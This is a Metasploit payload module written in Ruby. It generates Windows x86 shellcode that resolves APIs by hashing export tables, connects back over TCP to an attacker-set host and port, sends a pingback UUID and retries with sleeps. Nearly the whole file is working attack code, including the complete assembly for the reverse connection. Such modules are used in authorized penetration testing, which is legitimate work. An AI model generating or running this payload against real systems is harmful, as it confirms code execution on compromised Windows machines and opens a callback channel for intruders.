##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/pingback'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/pingback'
require 'msf/base/sessions/pingback_options'
module MetasploitModule

  CachedSize = 324

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::PingbackOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x86 Pingback, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and report UUID (Windows x86)',
      'Author'        => [ 'bwatters-r7' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::Pingback
      ))
    def generate_stage
      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first

      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
      retry_count  = [datastore['ReverseConnectRetries'].to_i, 1].max
      pingback_count = datastore['PingbackRetries']
      pingback_sleep = datastore['PingbackSleep']

      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
      pingback_uuid ||= generate_pingback_uuid
      uuid_as_db = "0x" + pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")




      addr_fam      = 2
      sockaddr_size = 16

      asm = %Q^
        cld                    ; Clear the direction flag.
        call start             ; Call start, this pushes the address of 'api_call' onto the stack.
        

        api_call:
          pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
          mov ebp, esp              ; Create a new stack frame
          xor eax, eax              ; Zero EAX (upper 3 bytes will remain zero until function is found)
          mov edx, [fs:eax+48]      ; Get a pointer to the PEB
          mov edx, [edx+12]         ; Get PEB->Ldr
          mov edx, [edx+20]         ; Get the first module from the InMemoryOrder module list
        next_mod:                   ;
          mov esi, [edx+40]         ; Get pointer to modules name (unicode string)
          movzx ecx, word [edx+38]  ; Set ECX to the length we want to check
          xor edi, edi              ; Clear EDI which will store the hash of the module name
        loop_modname:               ;
          lodsb                     ; Read in the next byte of the name
          cmp al, 'a'               ; Some versions of Windows use lower case module names
          jl not_lowercase          ;
          sub al, 0x20              ; If so normalise to uppercase
        not_lowercase:              ;
          ror edi, 13               ; Rotate right our hash value
          add edi, eax              ; Add the next byte of the name
          loop loop_modname         ; Loop untill we have read enough

          ; We now have the module hash computed
          push edx                  ; Save the current position in the module list for later
          push edi                  ; Save the current module hash for later
          ; Proceed to iterate the export address table
          mov edx, [edx+16]         ; Get this modules base address
          mov ecx, [edx+60]         ; Get PE header

          ; use ecx as our EAT pointer here so we can take advantage of jecxz.
          mov ecx, [ecx+edx+120]    ; Get the EAT from the PE header
          jecxz get_next_mod1       ; If no EAT present, process the next module
          add ecx, edx              ; Add the modules base address
          push ecx                  ; Save the current modules EAT
          mov ebx, [ecx+32]         ; Get the rva of the function names
          add ebx, edx              ; Add the modules base address
          mov ecx, [ecx+24]         ; Get the number of function names
          ; now ecx returns to its regularly scheduled counter duties

          ; Computing the module hash + function hash
        get_next_func:              ;
          jecxz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
          dec ecx                   ; Decrement the function name counter
          mov esi, [ebx+ecx*4]      ; Get rva of next module name
          add esi, edx              ; Add the modules base address
          xor edi, edi              ; Clear EDI which will store the hash of the function name
          ; And compare it to the one we want
        loop_funcname:              ;
          lodsb                     ; Read in the next byte of the ASCII function name
          ror edi, 13               ; Rotate right our hash value
          add edi, eax              ; Add the next byte of the name
          cmp al, ah                ; Compare AL (the next byte from the name) to AH (null)
          jne loop_funcname         ; If we have not reached the null terminator, continue
          add edi, [ebp-8]          ; Add the current module hash to the function hash
          cmp edi, [ebp+36]         ; Compare the hash to the one we are searchnig for
          jnz get_next_func         ; Go compute the next function hash if we have not found it

          ; If found, fix up stack, call the function and then value else compute the next one...
          pop eax                   ; Restore the current modules EAT
          mov ebx, [eax+36]         ; Get the ordinal table rva
          add ebx, edx              ; Add the modules base address
          mov cx, [ebx+2*ecx]       ; Get the desired functions ordinal
          mov ebx, [eax+28]         ; Get the function addresses table rva
          add ebx, edx              ; Add the modules base address
          mov eax, [ebx+4*ecx]      ; Get the desired functions RVA
          add eax, edx              ; Add the modules base address to get the functions actual VA
          ; We now fix up the stack and perform the call to the desired function...
        finish:
          mov [esp+36], eax         ; Overwrite the old EAX value with the desired api address for the upcoming popad
          pop ebx                   ; Clear off the current modules hash
          pop ebx                   ; Clear off the current position in the module list
          popad                     ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
          pop ecx                   ; Pop off the origional return address our caller will have pushed
          pop edx                   ; Pop off the hash value our caller will have pushed
          push ecx                  ; Push back the correct return value
          jmp eax                   ; Jump into the required function
          ; We now automagically return to the correct caller...

        get_next_mod:               ;
          pop edi                   ; Pop off the current (now the previous) modules EAT
        get_next_mod1:              ;
          pop edi                   ; Pop off the current (now the previous) modules hash
          pop edx                   ; Restore our position in the module list
          mov edx, [edx]            ; Get the next module
          jmp.i8 next_mod           ; Process this module
      
        start:
          pop ebp
        
        ; Input: EBP must be the address of 'api_call'.
        ; Output: EDI will be the socket for the connection to the server
        ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

        reverse_tcp:
          push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
          push 'ws2_'             ; ...
          push esp                ; Push a pointer to the "ws2_32" string on the stack.
          push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
          mov eax, ebp
          call eax                ; LoadLibraryA( "ws2_32" )

          mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
          sub esp, eax            ; alloc some space for the WSAData structure
          push esp                ; push a pointer to this stuct
          push eax                ; push the wVersionRequested parameter
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
          call ebp                ; WSAStartup( 0x0190, &WSAData );

        set_address:
          push #{pingback_count}     ; retry counter
          push #{retry_count}     ; retry counter
          push #{encoded_host}    ; host in little-endian format
          push #{encoded_port}    ; family AF_INET and port number
          mov esi, esp            ; save pointer to sockaddr struct

        create_socket:
          push eax                ; if we succeed, eax will be zero, push zero for the flags param.
          push eax                ; push null for reserved parameter
          push eax                ; we do not specify a WSAPROTOCOL_INFO structure
          push eax                ; we do not specify a protocol
          inc eax                 ;
          push eax                ; push SOCK_STREAM
          inc eax                 ;
          push eax                ; push AF_INET
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
          call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
          xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
        
        try_connect:
          push 16                 ; length of the sockaddr struct
          push esi                ; pointer to the sockaddr struct
          push edi                ; the socket
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
          call ebp                ; connect( s, &sockaddr, 16 );

          test eax,eax            ; non-zero means a failure
          jz connected

        handle_connect_failure:
          ; decrement our attempt count and try again
          dec dword [esi+8]
          jnz try_connect
        
          failure:
            call exitfunk
          
          ; this  lable is required so that reconnect attempts include
          ; the UUID stuff if required.
          connected:
          ;mov edi, eax
        send_pingback:
          push 0                 ; flags
          push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
          call get_pingback_address  ; put pingback_uuid buffer on the stack
          db #{uuid_as_db}  ; PINGBACK_UUID
        get_pingback_address:
          push edi               ; saved socket
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
          call ebp               ; call send

        cleanup_socket:
          ; clear up the socket
          push edi                ; socket handle
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
          call ebp                ; closesocket(socket)
        ^
        if pingback_count > 0
          asm << %Q^
            mov eax, [esi+12]
            test eax, eax               ; pingback counter
            jz exitfunk
            dec [esi+12]
            sleep:
              push #{(pingback_sleep*1000).to_s}
              push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
              call ebp                  ;sleep(pingback_sleep*1000)
              jmp create_socket
          ^
        end
        asm << %Q^
          ; restore the stack back to the connection retry count
          pop esi
          pop esi
          dec [esi+8]               ; decrement the retry counter
          jmp exitfunk

          ; try again
          jnz create_socket
          jmp failure
          
        exitfunk:

          mov ebx, 0x56a2b5f0
          push.i8 0              ; push the exit function parameter
          push ebx               ; push the hash of the exit function
          call ebp               ; ExitProcess(0)
      ^
    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
    end
  end
end
